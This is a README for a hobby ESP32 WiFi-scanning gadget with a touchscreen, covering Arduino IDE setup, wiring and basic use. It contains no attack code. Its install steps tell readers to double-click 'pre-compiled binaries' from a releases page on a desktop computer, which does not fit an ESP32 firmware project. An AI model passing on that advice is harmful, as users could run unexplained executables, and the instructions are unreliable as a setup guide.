# 🎉 DetectorAPFisico-Gadget-Hacking - Scan WiFi Networks Effortlessly

[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases)

## 📖 Description

DetectorAPFisico-Gadget-Hacking is a simple yet powerful tool that scans WiFi networks using the ESP32 chip and an ILI9341 touchscreen. It shows real-time signal strength, allowing you to select and track access points with ease. Whether you're interested in cybersecurity or just want to understand your WiFi environment better, this tool can help you out.

## 🚀 Getting Started

To start using the DetectorAPFisico-Gadget-Hacking application, follow these steps to download and run the software.

### ✔️ Requirements

- A computer (Windows, macOS, or Linux)
- A compatible ESP32 development board
- An ILI9341 touchscreen display
- Basic understanding of connecting hardware components (does not require programming skills)
- Internet connection to download the software

## 🔗 Download Links

Click on the button below to visit the release page and download the latest version:

[![Visit Releases](https://img.shields.io/badge/Visit%20Releases-green)](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases)

## 💾 Download & Install

1. Go to the [Releases page](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases).
2. Look for the latest release version.
3. Click on the appropriate file for your platform to start the download. 

    You can download either the source code or pre-compiled binaries, depending on your preference.

4. Once the file is downloaded, locate it on your computer.

5. If you downloaded a pre-compiled binary, simply double-click the file to run it. 
   If you downloaded the source code, you will need an Arduino IDE to compile and upload it to your ESP32 board.

## ⚙️ Installation Steps for ESP32

1. **Open the Arduino IDE:** If you don't have it yet, download and install the [Arduino IDE](https://www.arduino.cc/en/software).
   
2. **Install ESP32 Board Package:** 
   - Go to `File > Preferences`.
   - In the "Additional Board Manager URLs," add this link: `https://dl.espressif.com/dl/package_esp32_index.json`.
   - Then go to `Tools > Board > Boards Manager`, search for "ESP32," and install it.

3. **Load the project:** Open the DetectorAPFisico-Gadget-Hacking project file in the Arduino IDE.

4. **Configure your Settings:** Update any necessary settings such as WiFi credentials in the code if needed.

5. **Connect your ESP32:** Plug your ESP32 board into your computer using a Micro USB cable.

6. **Select the correct port:** In the Arduino IDE, go to `Tools > Port` and select the port connected to your ESP32.

7. **Upload the code:** Click the upload button in the Arduino IDE. Wait for it to finish.

8. **Connect the touchscreen:** Follow simple wiring diagrams available in the project documentation to connect the ILI9341 display properly.

## 🌐 How to Use

1. Power on your ESP32 board after uploading the code.
2. The touchscreen will initialize and display available WiFi networks.
3. Select a network to see its signal strength and other details.
4. You can track selected access points in real-time.

## 📚 Features

- **Real-time WiFi scanning:** Displays available networks and their signal strengths.
- **User-friendly interface:** The touchscreen makes navigating easy.
- **Tracking capability:** Select a network to track it continuously.
- **Lightweight & Fast:** Quick initialization, minimal resource usage.
  
## 🐛 Troubleshooting

If you encounter any issues, consider these tips:

- **No WiFi networks detected:** Ensure your ESP32 is properly connected and powered on.
- **Touchscreen not responding:** Recheck your wiring and ensure your display is compatible.
- **Compilation errors:** Ensure you have the correct board and libraries installed in the Arduino IDE.

For further assistance, feel free to check the [issues page](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/issues) or ask for help in the community.

## 🛠️ Contribution

Contributions are welcome! If you have ideas for improvements or bug fixes, feel free to fork the repository and submit a pull request.

## 📄 License

This project is licensed under the MIT License. You can use it freely, but please give credit to the original developers.

For more information on the DetectorAPFisico-Gadget-Hacking project, refer back to the releases page or review the source files in the repository.